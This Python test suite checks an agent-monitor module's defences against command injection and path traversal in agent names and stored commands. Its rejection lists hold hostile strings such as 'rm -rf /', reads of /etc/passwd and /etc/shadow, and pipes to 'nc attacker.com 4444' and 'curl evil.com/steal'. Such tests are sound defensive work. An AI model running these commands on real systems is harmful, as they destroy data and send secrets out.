#!/usr/bin/env python3
"""
Security Test Suite for Agent Monitor Security Fixes
Tests command injection and path traversal vulnerability fixes
"""

import importlib
import os
import shutil
import sys
import tempfile
import unittest
from unittest.mock import Mock

# Add orchestration directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

# Import agent monitor module
agent_monitor_module = importlib.import_module("agent_monitor")
ConvergeAgentRestarter = agent_monitor_module.ConvergeAgentRestarter


class TestSecurityValidation(unittest.TestCase):
    """Test security validation methods in ConvergeAgentRestarter"""

    def setUp(self):
        """Set up test environment"""
        self.temp_dir = tempfile.mkdtemp()
        self.original_cwd = os.getcwd()
        os.chdir(self.temp_dir)

        # Mock logger
        self.mock_logger = Mock()
        self.restarter = ConvergeAgentRestarter(self.mock_logger)

    def tearDown(self):
        """Clean up test environment"""
        os.chdir(self.original_cwd)
        shutil.rmtree(self.temp_dir)

    def test_validate_agent_name_valid_names(self):
        """Test that valid agent names are accepted"""
        valid_names = ["task-agent-test-1", "task_agent_test_2", "agent123", "test-agent", "a", "A1B2C3"]

        for name in valid_names:
            with self.subTest(name=name):
                self.assertTrue(self.restarter._validate_agent_name(name))

    def test_validate_agent_name_invalid_names(self):
        """Test that invalid agent names are rejected"""
        invalid_names = [
            "../test",  # Path traversal
            "test/../agent",  # Path traversal
            "test/agent",  # Directory traversal
            "agent;rm -rf /",  # Command injection
            "agent$(whoami)",  # Command substitution
            "agent`whoami`",  # Command substitution
            "agent|ls",  # Pipe injection
            "agent&& rm file",  # Command chaining
            "agent with spaces",  # Spaces not allowed
            "agent@test",  # Special characters
            "agent#test",  # Special characters
            "test\nagent",  # Newline
            "test\ragent",  # Carriage return
            "",  # Empty string
            "a" * 101,  # Too long (over 100 chars)
        ]

        for name in invalid_names:
            with self.subTest(name=name):
                self.assertFalse(self.restarter._validate_agent_name(name))

    def test_is_safe_command_valid_commands(self):
        """Test that safe commands are accepted"""
        safe_commands = [
            "/converge Complete all tasks",
            "/orch Execute workflow",
            "/execute Plan and implement",
            "/plan Create strategy",
            "/test Run test suite",
            "/converge",
            "/orch",
        ]

        for cmd in safe_commands:
            with self.subTest(command=cmd):
                self.assertTrue(self.restarter._is_safe_command(cmd))

    def test_is_safe_command_dangerous_commands(self):
        """Test that dangerous commands are rejected"""
        dangerous_commands = [
            "/converge; rm -rf /",  # Command injection
            "/orch && cat /etc/passwd",  # Command chaining
            "/execute | nc attacker.com 4444",  # Pipe to network
            "/converge `whoami`",  # Command substitution
            "/orch $(id)",  # Command substitution
            "/plan > /dev/null",  # Output redirection
            "/test < /etc/passwd",  # Input redirection
            "/converge || curl evil.com",  # Conditional execution
            "rm -rf /",  # Non-slash command
            "/invalid_command test",  # Not in allowed patterns
            "",  # Empty command
            "   ",  # Whitespace only
            "a" * 1001,  # Too long command
            "/converge\nrm -rf /",  # Newline injection
            "/orch\r&& malicious",  # Carriage return injection
        ]

        for cmd in dangerous_commands:
            with self.subTest(command=cmd):
                self.assertFalse(self.restarter._is_safe_command(cmd))

    def test_get_original_command_path_traversal_protection(self):
        """Test protection against path traversal attacks"""
        # Test various path traversal attempts
        malicious_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "test/../../sensitive_file",
            "agent/../../../etc/shadow",
        ]

        for name in malicious_names:
            with self.subTest(agent_name=name):
                result = self.restarter.get_original_command(name)
                # Should return fallback command, not read malicious files
                self.assertIn("Resume", result)
                # Should log warning about invalid agent name
                self.mock_logger.warning.assert_called()

    def test_get_original_command_injection_content_protection(self):
        """Test protection against command injection in file content"""
        agent_name = "task-agent-test"
        workspace_path = os.path.join("orchestration", "agent_workspaces", f"agent_workspace_{agent_name}")
        os.makedirs(workspace_path, exist_ok=True)

        # Create command file with malicious content
        command_file = f"{workspace_path}/original_command.txt"
        malicious_commands = [
            "/converge; rm -rf /",
            "/orch && curl evil.com/steal",
            "/execute | nc attacker.com 4444",
            "/plan `whoami` > /tmp/pwned",
        ]

        for malicious_cmd in malicious_commands:
            with self.subTest(command=malicious_cmd):
                with open(command_file, "w") as f:
                    f.write(malicious_cmd)

                result = self.restarter.get_original_command(agent_name)

                # Should return safe fallback, not the malicious command
                self.assertIn("Resume", result)
                self.assertNotEqual(result, malicious_cmd)

                # Should log warning about unsafe content
                warning_calls = [
                    call for call in self.mock_logger.warning.call_args_list if "Unsafe command content" in str(call)
                ]
                self.assertTrue(len(warning_calls) > 0)

                # Reset mock for next iteration
                self.mock_logger.reset_mock()

    def test_get_original_command_safe_content_allowed(self):
        """Test that safe command content is allowed through"""
        agent_name = "task-agent-safe"
        workspace_path = os.path.join("orchestration", "agent_workspaces", f"agent_workspace_{agent_name}")
        os.makedirs(workspace_path, exist_ok=True)

        command_file = f"{workspace_path}/original_command.txt"
        safe_command = "/converge Complete all pending tasks"

        with open(command_file, "w") as f:
            f.write(safe_command)

        result = self.restarter.get_original_command(agent_name)
        self.assertEqual(result, safe_command)

    def test_get_original_command_absolute_path_validation(self):
        """Test that absolute path validation works correctly"""
        # This test ensures the path traversal protection at the filesystem level
        agent_name = "task-agent-valid"
        workspace_path = os.path.join("orchestration", "agent_workspaces", f"agent_workspace_{agent_name}")
        os.makedirs(workspace_path, exist_ok=True)

        # Create legitimate command file
        command_file = f"{workspace_path}/original_command.txt"
        with open(command_file, "w") as f:
            f.write("/converge Valid command")

        # Should work normally for legitimate agent
        result = self.restarter.get_original_command(agent_name)
        self.assertEqual(result, "/converge Valid command")

    def test_fallback_commands_are_safe(self):
        """Test that fallback commands are always safe"""
        test_cases = [
            ("task-agent-converge-test", "/converge Resume previous convergence task"),
            ("task-agent-regular", "/orch Resume task execution"),
            ("converge-agent-123", "/converge Resume previous convergence task"),
            ("regular-agent-456", "/orch Resume task execution"),
        ]

        for agent_name, expected in test_cases:
            with self.subTest(agent_name=agent_name):
                result = self.restarter._get_fallback_command(agent_name)
                self.assertEqual(result, expected)
                # Verify fallback is safe
                self.assertTrue(self.restarter._is_safe_command(result))


if __name__ == "__main__":
    # Run tests with detailed output
    unittest.main(verbosity=2)
